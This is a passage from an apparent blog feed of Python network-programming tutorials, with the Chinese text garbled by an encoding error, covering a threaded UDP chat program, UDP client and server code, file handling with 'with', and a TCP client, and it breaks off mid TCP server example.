        <content type="html"><![CDATA[<p>å¥—æ¥å­—æ˜¯å…¨åŒå·¥ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä½¿ç”¨ä¸€ä¸ªå¥—æ¥å­—ï¼Œä½¿ç”¨ä¸¤ä¸ªå­çº¿ç¨‹æ¥æ¥æ”¶å’Œå‘é€æ¶ˆæ¯ä¾¿å¯ä»¥äº†ã€‚</p><p>å½“ç„¶ï¼Œå¦‚æœè¦ä¸¤ä¸ªéƒ½èƒ½æ”¶æ¶ˆæ¯ï¼Œæˆ‘ä»¬éœ€è¦éƒ½ç»‘å®šç«¯å£ã€‚</p><p>ä¸‹é¢ç»™å‡ºä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_msg</span>(<span class="params">udp_socket</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;æ¥æ”¶æ•°æ®&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">recv_data = udp_socket.recvfrom(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># print(recv_data)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s:%s&quot;</span> % (<span class="built_in">str</span>(recv_data[<span class="number">1</span>]), recv_data[<span class="number">0</span>].decode(<span class="string">&#x27;gbk&#x27;</span>)))  <span class="comment"># 1. æ¥æ”¶æ˜¯è§£ç éœ€è¦decodeï¼Œè€Œä¸æ˜¯encode 2. æ³¨æ„ str çš„æ‹¬å·</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_msg</span>(<span class="params">udp_socket, dest_ip, dest_port</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;å‘é€æ•°æ®&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">send_data = <span class="built_in">input</span>(<span class="string">&#x27;è¾“å…¥è¦å‘é€çš„æ•°æ®ï¼š&#x27;</span>)</span><br><span class="line">udp_socket.sendto(send_data.encode(<span class="string">&#x27;gbk&#x27;</span>), (dest_ip, dest_port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; å®Œæˆ udp èŠå¤©å™¨çš„æ•´ä½“æ§åˆ¶&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. åˆ›å»ºå¥—æ¥å­—</span></span><br><span class="line">udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. ç»‘å®šæœ¬åœ°ä¿¡æ¯</span></span><br><span class="line">udp_socket.bind((<span class="string">&#x27;&#x27;</span>, <span class="number">7890</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. è·å–å¯¹æ–¹çš„ ip ä¸ port</span></span><br><span class="line">dest_ip = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥å¯¹æ–¹çš„ ipï¼š &#x27;</span>)</span><br><span class="line">dest_port = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥å¯¹æ–¹çš„ portï¼š&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. åˆ›å»ºä¸¤ä¸ªçº¿ç¨‹ï¼Œå»æ‰§è¡Œç›¸åº”çš„åŠŸèƒ½</span></span><br><span class="line">t_recv = threading.Thread(target=recv_msg, args=(udp_socket, ))</span><br><span class="line">t_send = threading.Thread(target=send_msg, args=(udp_socket, dest_ip, dest_port))</span><br><span class="line"></span><br><span class="line">t_recv.start()</span><br><span class="line">t_send.start()</span><br><span class="line"></span><br><span class="line">udp_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>ç®€å•è®²è§£ï¼š</p><p>å› ä¸ºæˆ‘ä»¬è¦æ¥æ”¶ä¿¡æ¯ï¼Œæ‰€ä»¥éœ€è¦ç»‘å®šä¸€ä¸‹ç«¯å£ã€‚</p><p>å°†æ”¶æ¶ˆæ¯å’Œå‘æ¶ˆæ¯åˆ†åˆ«æ”¾åˆ°ä¸¤ä¸ªçº¿ç¨‹ä¸­ï¼Œåˆ†åˆ«æ‰§è¡Œå¯¹åº”åŠŸèƒ½</p><p>æ³¨æ„ï¼š</p><p>æ”¶æ¶ˆæ¯ï¼Œè¦å°†æ”¶åˆ°çš„ bytes è§£ç ï¼ˆdecodeï¼‰ä¸ºå¯¹åº”å¹³å°çš„ç¼–ç </p><p>å‘æ¶ˆæ¯ï¼Œè¦å°†æ¶ˆæ¯ç¼–ç ï¼ˆencodeï¼‰ä¸º bytesï¼Œç„¶ååœ¨å‘é€ã€‚</p><p>æˆ‘ä½¿ç”¨çš„éƒ½æ˜¯ Windows å¹³å°ï¼Œæ‰€ä»¥ç¼–è§£ç éƒ½æ˜¯ç”¨ GBK</p><p>æ”¶å‘æ•°æ®æ¡æ•°ä¸å›ºå®šï¼Œä½¿ç”¨ while True</p><p>Thread çš„ args å‚æ•°çš„ä¼ é€’ï¼ˆå…ƒç»„ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python UDP ç¼–ç¨‹</title>
      <link href="/blog/2019/08/31/programming/python/3.network_programming/02.py_udp/"/>
      <url>/blog/2019/08/31/programming/python/3.network_programming/02.py_udp/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹">ç®€ä»‹</h1><p>å»ºä¸€ä¸ªåŸºäº udp çš„ç½‘ç»œç¨‹åºæµç¨‹å¾ˆç®€å•ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol type="1"><li>åˆ›å»ºå®¢æˆ·ç«¯å¥—æ¥å­—</li><li>å‘é€/æ¥æ”¶æ•°æ®</li><li>å…³é—­å¥—æ¥å­—</li></ol><p>æ³¨ï¼š udpå¯¹å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„åŒºåˆ†å¹¶ä¸å¤§ï¼Œä¸€ä¸ªç¨‹åºå¯ä»¥æ—¢ä½œæœåŠ¡ç«¯ï¼Œåˆä½œå®¢æˆ·ç«¯ï¼Œè€Œä¸”æ”¶å‘ä½¿ç”¨ç›¸åŒçš„å‡½æ•°æ–¹æ³•ã€‚</p><h1 id="udp-é€šä¿¡æ¨¡å‹">UDP é€šä¿¡æ¨¡å‹</h1><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/py_udp.png" /></p><h2 id="å®¢æˆ·ç«¯">å®¢æˆ·ç«¯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="comment">#1. create socket</span></span><br><span class="line">udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰‹åŠ¨è¾“å…¥å¯¹æ–¹çš„ ip å’Œç«¯å£</span></span><br><span class="line">dest_ip = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥å¯¹æ–¹çš„ ip: &#x27;</span>)</span><br><span class="line">dest_port = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥å¯¹æ–¹çš„ port :&#x27;</span>))  <span class="comment"># æ³¨:è¿™é‡Œè¦æ˜¯è¾“å…¥äº†å­—æ¯ç­‰éæ•°å­—,ä¼šæŠ¥é”™.å¯ä»¥ä½¿ç”¨tryæ•è·.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;è¯·è¾“å…¥æ•°æ®: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># ç»‘å®šä¸€ä¸ªç«¯å£</span></span><br><span class="line">udp_socket.bind((<span class="string">&#x27;&#x27;</span>,<span class="number">7798</span>))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="comment"># get message from keyboard</span></span><br><span class="line">send_data = <span class="built_in">input</span>()</span><br><span class="line"><span class="comment">#å¦‚æœè¾“å…¥çš„æ˜¯ exit, é‚£ä¹ˆå°±é€€å‡º</span></span><br><span class="line"><span class="keyword">if</span> send_data == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment">#2. use socket to send and receive data</span></span><br><span class="line"><span class="comment"># ip_socket.sendto(&#x27;hehe&#x27;, å¯¹æ–¹çš„ipä»¥åŠç«¯å£)</span></span><br><span class="line">ip_port = (<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8080</span>)</span><br><span class="line"><span class="comment">#udp_socket.sendto(b&#x27;Hello World&#x27;,ip_port)</span></span><br><span class="line">udp_socket.sendto(send_data.encode(<span class="string">&#x27;gbk&#x27;</span>), ip_port)</span><br><span class="line"><span class="comment"># 3. close socket</span></span><br><span class="line">udp_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>print å‡½æ•°é»˜è®¤ä¼šæ‰“å°å›è½¦æ¢è¡Œï¼Œå¦‚æœä¸æƒ³è¿™æ ·ï¼Œå¯ä»¥å°† endå‚æ•°èµ‹å€¼ä¸ºç©ºå­—ç¬¦ä¸²ã€‚</p><p>ç¼–ç è½¬æ¢ï¼š</p><p>&lt;class 'bytes'&gt; ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢ï¼šå­—èŠ‚-&gt;å­—ç¬¦ä¸²ï¼ˆè§£ç ï¼Œä½¿ç”¨decodeï¼‰ï¼Œå­—ç¬¦ä¸²-&gt;å­—èŠ‚ï¼ˆç¼–ç ï¼Œä½¿ç”¨encodeï¼‰ï¼Œå…·ä½“ç¼–è§£ç ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸æ“ä½œç³»ç»Ÿé»˜è®¤å­—ç¬¦é›†æœ‰å…³ï¼Œå…¶ä¸­ï¼šWindowsé»˜è®¤å­—ç¬¦é›†ä¸º gbkï¼Œ Mac ä¸ Linux å¯ä»¥ä½¿ç”¨ utf-8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span> = <span class="string">b&#x27;hello&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span></span><br><span class="line"><span class="string">b&#x27;hello&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string = <span class="built_in">str</span>.decode()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string</span><br><span class="line"><span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(string)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str_b = string.encode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str_b</span><br><span class="line"><span class="string">b&#x27;hello&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(str_b)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="æœåŠ¡ç«¯">æœåŠ¡ç«¯</h2><p>å¦‚æœåªéœ€è¦å‘é€æ¶ˆæ¯,é‚£åªéœ€è¦éšæœºç«¯å£å³å¯.ä½†å¦‚æœéœ€è¦æ¥æ”¶æ¶ˆæ¯çš„è¯ï¼ˆå³ï¼šæœåŠ¡ç«¯ï¼‰ï¼Œéœ€è¦ç»‘å®šå›ºå®šçš„ç«¯å£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="comment"># 1. åˆ›å»ºå¥—æ¥å­—</span></span><br><span class="line">udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. ç»‘å®šæœ¬åœ°ä¿¡æ¯</span></span><br><span class="line">local_addr = (<span class="string">&#x27;&#x27;</span>, <span class="number">7788</span>)</span><br><span class="line">udp_socket.bind(local_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="comment"># 3. æ¥æ”¶æ•°æ®</span></span><br><span class="line">recv_data = udp_socket.recvfrom(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># recv_data è¿™ä¸ªå˜é‡ä¸­å­˜å‚¨çš„æ˜¯ä¸€ä¸ªå…ƒç»„(æ¥å—åˆ°çš„æ•°æ®,(å‘é€æ–¹çš„ ip, port))</span></span><br><span class="line">recv_msg = recv_data[<span class="number">0</span>]  <span class="comment"># å­˜å‚¨æ¥æ”¶åˆ°çš„æ•°æ®</span></span><br><span class="line">send_addr = recv_data[<span class="number">1</span>]  <span class="comment"># å­˜å‚¨å‘é€æ–¹çš„åœ°å€ä¿¡æ¯.</span></span><br><span class="line">msg_decode = recv_msg.decode(<span class="string">&quot;gbk&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> msg_decode == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment"># 4. æ‰“å°æ¥æ”¶åˆ°çš„æ•°æ®</span></span><br><span class="line"><span class="comment">#print(recv_data)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s:%s&quot;</span> % (<span class="built_in">str</span>(send_addr), msg_decode))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. å…³é—­å¥—æ¥å­—</span></span><br><span class="line">udp_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>bind å‡½æ•°ç»‘å®šæœ¬åœ° ip ä»¥åŠç«¯å£,å¦‚æœä¸€ä¸ªç½‘ç»œç¨‹åºä¸ç»‘å®š,åˆ™ç³»ç»Ÿä¼šéšæœºåˆ†é….</p><p>bind å‡½æ•°çš„å‚æ•°ä¹Ÿæ˜¯ä¸€ä¸ª ip port å…ƒç»„,å…¶ä¸­æœ¬åœ° ipçš„è¯,å°±ç›´æ¥å†™ä¸€ä¸ªç©ºçš„å­—ç¬¦ä¸²å³å¯. è¡¨ç¤ºæœ¬åœ°çš„ä»»æ„ä¸€ä¸ª ip.ç»‘å®šä¿¡æ¯çš„æ—¶å€™å¿…é¡»ç»‘å®šè‡ªå·±ç”µè„‘çš„ ip ä»¥åŠ port,ç»‘å®šåˆ«çš„ç”µè„‘çš„ä¸è¡Œ.</p><p>recv_data è¿™ä¸ªå˜é‡ä¸­å­˜å‚¨çš„æ˜¯ä¸€ä¸ªå…ƒç»„(æ¥å—åˆ°çš„æ•°æ®,(å‘é€æ–¹çš„ ip,port))ã€‚</p><p>ä¸€èˆ¬æˆ‘ä»¬æ¥æ”¶åˆ°æ•°æ®åï¼Œå°† recv_data[0] ä½¿ç”¨ decode ä» bytes è§£ç ä¸ºstringï¼Œ å°† recv_data[1] ç›´æ¥å¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ã€‚</p><p>å½“å¯¹æ–¹å‘é€æ•°æ®è¿‡æ¥æ—¶ï¼Œæ“ä½œç³»ç»Ÿå…ˆä½¿ç”¨ç¼“å†²åŒºå­˜å‚¨èµ·æ¥ï¼Œåº”ç”¨ç¨‹åº recvfromå–æ•°æ®çš„æ—¶å€™ï¼Œæ‰ä¼šä»ç¼“å†²åŒºå–å‡ºæ•°æ®ã€‚è¿™æ ·å°±å®¹æ˜“é€ æˆç¼“å†²åŒºæº¢å‡ºã€‚æ‰€ä»¥ä¸€èˆ¬æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºå¦‚æœè¦æ¥æ”¶æ•°æ®ï¼Œä¸€èˆ¬éƒ½ä½¿ç”¨while True æ¥æ”¶ï¼ˆrecvfrom åœ¨æ•°æ®æ²¡æœ‰åˆ°æ¥çš„æ—¶å€™,ä¼šå µå¡åœ¨é‚£é‡Œï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python TCPç¼–ç¨‹</title>
      <link href="/blog/2019/08/31/programming/python/3.network_programming/03.py_tcp/"/>
      <url>/blog/2019/08/31/programming/python/3.network_programming/03.py_tcp/</url>
      
        <content type="html"><![CDATA[<h1 id="å…ˆè¡ŒçŸ¥è¯†">å…ˆè¡ŒçŸ¥è¯†</h1><p>TCP æ˜¯é¢å‘è¿æ¥çš„ï¼Œå› æ­¤ TCP socketç¼–ç¨‹åœ¨å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯å‰éœ€è¦åˆ›å»ºè¿æ¥ã€‚åŒæ ·çš„ï¼ŒTCPçš„å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´æ”¶å‘çš„æ•°æ®åªæœ‰æ¶ˆæ¯ï¼Œæ²¡æœ‰ ip portå…ƒç»„ï¼Œå› ä¸ºä¹‹å‰å·²ç»å»ºç«‹äº†è¿æ¥ã€‚</p><p>TCP è¦åŒºåˆ†å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ï¼ŒäºŒè€…çš„ç¼–å†™å·®å¼‚è¾ƒå¤§ã€‚</p><p>with as çš„é€‚ç”¨åœºæ™¯ï¼š</p><p>å¦‚æœä½ æ‰“å¼€æ—¶æ²¡æœ‰äº§ç”Ÿå¼‚å¸¸ï¼Œåè€Œåœ¨è¯»å†™æ–‡ä»¶è¿‡ç¨‹ä¸­äº§ç”Ÿäº†å¼‚å¸¸ï¼Œä½†æ˜¯ä½ æœ€ç»ˆè¿˜æ˜¯è¦å…³é—­æ–‡ä»¶çš„ï¼Œæ‰€ä»¥ä½ éœ€è¦ç”¨try æ¥æ•è·è¯»å†™è¿‡ç¨‹ä¸­çš„å¼‚å¸¸ï¼Œè€Œ Python ä½¿ç”¨ withä¾¿å¯ä»¥è§£å†³è¿™æ ·çš„é—®é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f.write()/read()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™ä¸€æ®µä»£ç ä¾¿å¯ä»¥ä½¿ç”¨ with as å†™æˆä¸‹é¢çš„æ ·å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xxx&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write()/read()</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šwith ä¸­ä¸éœ€è¦å†™ close ï¼Œå®ƒä¼šä¿è¯å…³é—­æ–‡ä»¶ã€‚</p><p>with open(æ–‡ä»¶åå­—ç¬¦ä¸²ï¼Œæ‰“å¼€æ–¹å¼) as f</p><p>â€‹ f.write(å†…å®¹å­—ç¬¦ä¸²)</p><p>with as ä¸è®ºæ˜¯å¦å†™å…¥å†…å®¹æ˜¯å¦å­˜åœ¨éƒ½ä¼šå…³é—­æ–‡ä»¶ã€‚</p><p>æ³¨æ„ï¼šå¦‚æœæ²¡æœ‰è¦æ‰“å¼€çš„æ–‡ä»¶æˆ–æ‰“å¼€æ–‡ä»¶æŠ¥é”™ï¼Œç”¨ with asä¹Ÿæ²¡å•¥ç”¨äº†ï¼Œæ­¤æ—¶ï¼Œå°±è¯¥ç”¨ try catch äº†ã€‚ä¸€èˆ¬ä½¿ç”¨ with asä»¥å†™çš„æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œå› ä¸ºé‚£æ ·ï¼Œæ²¡æœ‰å°±ä¼šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶æ‰“å¼€å¤„ï¼Œå°±ä¸ä¼šæŠ¥é”™ã€‚æ‰€ä»¥å¦‚æœä½ è¦è¯»æ–‡ä»¶ï¼Œè¿˜æ˜¯ç”¨try catchã€‚</p><h1 id="tcp-é€šä¿¡æ¨¡å‹">TCP é€šä¿¡æ¨¡å‹</h1><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/py_tcp.png" /></p><h2 id="å®¢æˆ·ç«¯">å®¢æˆ·ç«¯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 1. åˆ›å»º tcp å¥—æ¥å­—</span></span><br><span class="line">    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. åˆ›å»ºä¸æœåŠ¡å™¨çš„ TCP é“¾æ¥</span></span><br><span class="line">    <span class="comment"># tcp_socket.connect((&#x27;192.168.33.11&#x27;,7989))</span></span><br><span class="line">    server_ip = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥è¦é“¾æ¥çš„æœåŠ¡å™¨ ipï¼š&#x27;</span>)</span><br><span class="line">    server_port = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥è¦é“¾æ¥çš„æœåŠ¡å™¨çš„ portï¼š&#x27;</span>))</span><br><span class="line">    server_addr = (server_ip,server_port)</span><br><span class="line">    tcp_socket.connect(server_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. å‘é€çš„æ•°æ®/æ¥æ”¶æ•°æ®</span></span><br><span class="line">    send_data = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥è¦å‘é€çš„æ•°æ®ï¼š&#x27;</span>)</span><br><span class="line">    tcp_socket.send(send_data.encode(<span class="string">&#x27;gbk&#x27;</span>))  <span class="comment"># tcp å‘é€æ¶ˆæ¯ä½¿ç”¨sendï¼Œè€Œä¸”å‚æ•°åªæœ‰æ¶ˆæ¯ï¼Œå› ä¸ºå‰é¢å·²ç»å»ºç«‹è¿‡é“¾æ¥äº†ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. å…³é—­å¥—æ¥å­—</span></span><br><span class="line">    tcp_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼š TCP ä½¿ç”¨ SOCK_STREAMï¼Œ ä¸ UDP ä¸åŒï¼Œ TCPæ˜¯åŸºäºè¿æ¥çš„ï¼Œæ‰€ä»¥å®ƒåªéœ€è¦ä¸€å¼€å§‹åˆ›å»ºä¸€ä¸ª TCPè¿æ¥ï¼Œä¹‹åå‘é€æ¶ˆæ¯ä¾¿ä¸ç”¨å†å‘ UDP é‚£æ ·æŒ‡å®šç›®æ ‡ç¨‹åºçš„ IP ä»¥åŠç«¯å£ï¼ˆè¿™ä¹Ÿå°±æ˜¯ TCP çš„ send å‡½æ•°ä¸ UDP çš„ sendto å‡½æ•°çš„ä¸åŒï¼‰ã€‚</p><p>TCP çš„å®¢æˆ·ç«¯æ²¡æœ‰å¿…è¦</p><h2 id="æœåŠ¡ç«¯">æœåŠ¡ç«¯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 1. åˆ›å»ºå¥—æ¥å­—</span></span><br><span class="line">    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. ç»‘å®šæœ¬åœ°ä¿¡æ¯ bind</span></span><br><span class="line">    tcp_server_socket.bind((<span 